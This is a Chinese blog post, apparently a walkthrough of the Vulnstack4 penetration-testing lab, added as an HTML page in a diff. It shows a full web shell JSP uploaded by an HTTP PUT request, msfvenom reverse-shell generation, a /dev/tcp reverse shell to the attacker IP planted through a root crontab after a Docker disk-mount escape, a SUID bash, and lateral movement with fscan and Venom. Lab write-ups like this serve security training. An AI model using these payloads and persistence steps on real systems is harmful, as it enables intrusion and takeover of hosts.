@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="红日靶场4 vulnstack4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场4-vulnstack4">
+<meta property="og:url" content="https://apsry.github.io/2022/03/22/Vulnstack4/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="红日靶场4 vulnstack4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212054229.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212100188.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212133485.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212200998.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212159086.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212200572.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212210537.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212211095.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212211486.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212212364.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212214032.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212217607.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212241817.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212244220.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212244309.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212329625.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221644808.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212346451.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212350908.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212352113.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212353999.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203220000482.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203220001919.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221607162.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221608873.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221653823.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221653060.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221704597.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221707382.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221709417.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221734040.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221735402.png">
+<meta property="article:published_time" content="2022-03-22T07:26:00.000Z">
+<meta property="article:modified_time" content="2022-03-24T08:10:02.713Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212054229.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/22/Vulnstack4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场4-vulnstack4 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/22/Vulnstack4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场4-vulnstack4
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-22 15:26:00" itemprop="dateCreated datePublished" datetime="2022-03-22T15:26:00+08:00">2022-03-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-24 16:10:02" itemprop="dateModified" datetime="2022-03-24T16:10:02+08:00">2022-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>红日靶场4 vulnstack4</p>
+<span id="more"></span>
+
+
+
+
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212054229.png" alt="img"></p>
+<p>虚拟机设置主机</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212100188.png" alt="image-20220321210038092"></p>
+<p>ubuntu NAT+VM6，其它都是VM6内网</p>
+<p><strong>目标端</strong></p>
+<blockquote>
+<p><strong>ubuntu</strong></p>
+<p>IP1: 192.168.43.133<br>IP2: 192.168.183.128<br>ubuntu:ubuntu</p>
+</blockquote>
+<blockquote>
+<p><strong>win7</strong><br>IP: 192.168.183.129<br>douser:Dotest123</p>
+</blockquote>
+<blockquote>
+<p><strong>DC</strong></p>
+<p>IP: 192.168.183.130<br>administrator:Test2008</p>
+</blockquote>
+<p><strong>攻击端</strong></p>
+<blockquote>
+<p>kali 192.168.43.130</p>
+</blockquote>
+<p><strong>ubuntu准备</strong></p>
+<p>1、开启struts2服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>2、开启tomcat服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>3、开启phpmyadmin服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212133485.png" alt="image-20220321213347400"></p>
+<h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -sT -sV 192.168.43.133</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212200998.png" alt="image-20220321220029910"></p>
+<h3 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212159086.png" alt="image-20220321215939977"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212200572.png" alt="image-20220321220002524"></p>
+<h3 id="phpmyadmin，tomcat"><a href="#phpmyadmin，tomcat" class="headerlink" title="phpmyadmin，tomcat"></a>phpmyadmin，tomcat</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miraitowa666/p/14840838.html">https://www.cnblogs.com/miraitowa666/p/14840838.html</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/shell.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.136:2002</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>628</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml">&lt;%@page import=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="keyword">class</span> U extends ClassLoader&#123;<span class="constructor">U(ClassLoader <span class="params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="literal">[]</span>b)&#123;return super.define<span class="constructor">Class(<span class="params">b</span>,0,<span class="params">b</span>.<span class="params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.get<span class="constructor">Method()</span>.equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml"><span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="constructor">Value(<span class="string">&quot;u&quot;</span>,<span class="params">k</span>)</span>;</span></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml">Cipher c=<span class="module-access"><span class="module"><span class="identifier">Cipher</span>.</span></span>get<span class="constructor">Instance(<span class="string">&quot;AES&quot;</span>)</span>;c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="constructor">SecretKeySpec(<span class="params">k</span>.<span class="params">getBytes</span>()</span>,<span class="string">&quot;AES&quot;</span>));</span></span><br><span class="line"><span class="language-reasonml"></span></span><br><span class="line"><span class="language-reasonml"><span class="keyword">new</span> <span class="constructor">U(<span class="params">this</span>.<span class="params">getClass</span>()</span>.get<span class="constructor">ClassLoader()</span>).g(c.<span class="keyword">do</span><span class="constructor">Final(<span class="params">new</span> <span class="params">sun</span>.<span class="params">misc</span>.BASE64Decoder()</span>.decode<span class="constructor">Buffer(<span class="params">request</span>.<span class="params">getReader</span>()</span>.read<span class="constructor">Line()</span>))).<span class="keyword">new</span><span class="constructor">Instance()</span>.equals(pageContext);&#125;%&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>我们这个时候拿了权限，直接上msf</p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>生成木马</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.130 LPORT=4444 -f elf &gt; shell.elf</code></p>
+<p>起个http服务</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212210537.png" alt="image-20220321221026475"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212211095.png" alt="image-20220321221102027"></p>
+<p>执行命令下载</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212211486.png" alt="image-20220321221141420"></p>
+<p>赋权再执行</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212212364.png" alt="image-20220321221224298"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.114  </span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport 4444 </span><br></pre></td></tr></table></figure>
+
+<p>执行下，可以看到上线了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212214032.png" alt="image-20220321221448937"></p>
+<p>容器是通过 cgroup 实现资源限制，判断容器是否在一个 cgroup 组中</p>
+<p>使用下面命令，查看是否存在 dockerrnv 文件</p>
+<p>ls -alh &#x2F;.dockerenv</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212217607.png" alt="image-20220321221728538"></p>
+<h3 id="docker逃逸-CVE-2019-5736"><a href="#docker逃逸-CVE-2019-5736" class="headerlink" title="docker逃逸(CVE-2019-5736)"></a>docker逃逸(CVE-2019-5736)</h3><p>建议在这之前做个快照，因为攻击完成会影响docker运行</p>
+<p>这个时候得考虑docker逃逸</p>
+<p>cve-2019-5736</p>
+<p>利用CVE-2019-5736进行docker逃逸<br>下载并编译main.go脚本，生成攻击payload： <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a><br>打开main.go脚本，将执行的命令替换成反弹shell命令</p>
+<p><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212241817.png" alt="image-20220321224113679"></p>
+<p>msf上传</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212244220.png" alt="image-20220321224430171"></p>
+<p>赋权执行</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212244309.png" alt="image-20220321224410244"></p>
+<p>模拟复现</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212329625.png" alt="image-20220321232933527"></p>
+<h3 id="docker-挂载磁盘逃逸"><a href="#docker-挂载磁盘逃逸" class="headerlink" title="docker(挂载磁盘逃逸)"></a>docker(挂载磁盘逃逸)</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221644808.png" alt="image-20220322164400723"></p>
+<p>当docker容器内拥有宿主机文件读写权限时，可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
+<p>查看磁盘文件: fdisk -l</p>
+<p>新建目录以备挂载: mkdir &#x2F;test</p>
+<p>将宿主机&#x2F;dev&#x2F;sda1 目录挂载至容器内 &#x2F;test: mount &#x2F;dev&#x2F;sda1 &#x2F;test</p>
+<p>即可写文件获取权限或数据</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212346451.png" alt="image-20220321234655346"></p>
+<p>写反弹shell脚本</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">touch /<span class="keyword">test</span>/tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">chmod +x /<span class="keyword">test</span>/tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ls</span> -ll /<span class="keyword">test</span>/tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;#!/bin/bash&quot;</span> &gt;&gt; /<span class="keyword">test</span>/tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/192.168.43.130/9090 0&gt;&amp;1&quot;</span>  &gt;&gt; /<span class="keyword">test</span>/tmp/<span class="keyword">test</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212350908.png" alt="image-20220321235003801"></p>
+<p>写入任务计划</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;<span class="variable">$a</span>*/2 *   * * *   root  bash /tmp/<span class="keyword">test</span>.<span class="keyword">sh</span> &#x27; /<span class="keyword">test</span>/etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="keyword">cat</span> /<span class="keyword">test</span>/etc/crontab</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212352113.png" alt="image-20220321235238871"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212353999.png" alt="image-20220321235321927"></p>
+<p>加个用户，再给个suid shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/bin/</span>bash <span class="regexp">/tmp/</span>shell</span><br><span class="line">chmod u+s <span class="regexp">/tmp/</span>shell</span><br><span class="line"><span class="regexp">/tmp/</span>shell -p</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203220000482.png" alt="image-20220322000051398"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203220001919.png" alt="image-20220322000104820"></p>
+<p>即可root权限</p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>弹个shell给msf</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221607162.png" alt="image-20220322160733999"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221608873.png" alt="image-20220322160857782"></p>
+<h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><p>这边可以直接传个fscan上去扫描</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221653823.png" alt="image-20220322165341678"></p>
+<p>报了域控和ms17-010</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221653060.png" alt="image-20220322165353973"></p>
+<h3 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h3><p>这边起个venom</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom/releases/tag/v1.1.0">https://github.com/Dliv3/Venom/releases/tag/v1.1.0</a></p>
+<p><code>./admin_linux_x64 -lport 6666</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221704597.png" alt="image-20220322170420510"></p>
+<p>把agent传上去</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221707382.png" alt="image-20220322170729240"></p>
+<p>进入节点，起个代理</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221709417.png" alt="image-20220322170940341"></p>
+<p>然后msf直接设置代理来攻击</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221734040.png" alt="image-20220322173443984"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203221735402.png" alt="image-20220322173550357"></p>
+<p>然后拿下主机后就是ms14-068和抓hash</p>
+<p>具体参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV19r4y1y7Nk?from=search&amp;seid=13855736893927951137&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV19r4y1y7Nk?from=search&amp;seid=13855736893927951137&amp;spm_id_from=333.337.0.0</a></p>
+<p>win7的IP一直不能改，懒得提权改了，后面的和和前面的横向移动都差不多，主要是docker有意思</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/21/Vulnstack3/" rel="prev" title="红日靶场3-vulnstack3">
+      <i class="fa fa-chevron-left"></i> 红日靶场3-vulnstack3
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/24/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/" rel="next" title="MD5,RSA,SHA256,DES原理">
+      MD5,RSA,SHA256,DES原理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91"><span class="nav-text">外网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#s2-045"><span class="nav-text">s2-045</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmyadmin%EF%BC%8Ctomcat"><span class="nav-text">phpmyadmin，tomcat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF"><span class="nav-text">MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker%E9%80%83%E9%80%B8-CVE-2019-5736"><span class="nav-text">docker逃逸(CVE-2019-5736)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%E9%80%83%E9%80%B8"><span class="nav-text">docker(挂载磁盘逃逸)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-text">横向渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fscan"><span class="nav-text">fscan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#venom"><span class="nav-text">venom</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
